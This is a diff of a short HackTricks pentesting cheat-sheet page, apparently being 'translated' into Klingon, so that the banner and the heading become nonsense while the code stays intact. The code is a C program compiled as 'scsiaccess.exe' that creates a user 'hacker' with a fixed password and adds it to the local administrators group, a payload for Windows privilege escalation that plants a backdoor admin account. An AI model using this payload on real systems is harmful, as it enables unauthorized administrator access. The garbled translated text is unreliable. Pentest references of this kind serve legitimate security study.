@@ -1,8 +1,6 @@
-
-
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>qaStaHvIS AWS hacking vItlhutlh</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Other ways to support HackTricks:
 
@@ -15,23 +13,19 @@ Other ways to support HackTricks:
 </details>
 
 
-# Add user
-
+# potlh user
 ```c
 // i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c
 
-#include <stdlib.h> /* system, NULL, EXIT_FAILURE */  
-int main ()  
-{  
-    int i;
-    system("net user hacker Hacker123! /add");
-    system("net localgroup administrators hacker /add");  
-    return 0;  
+#include <stdlib.h> /* system, NULL, EXIT_FAILURE */
+int main ()
+{
+int i;
+system("net user hacker Hacker123! /add");
+system("net localgroup administrators hacker /add");
+return 0;
 }
 ```
-
-
-
 <details>
 
 <summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
@@ -45,5 +39,3 @@ Other ways to support HackTricks:
 * **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
-
-
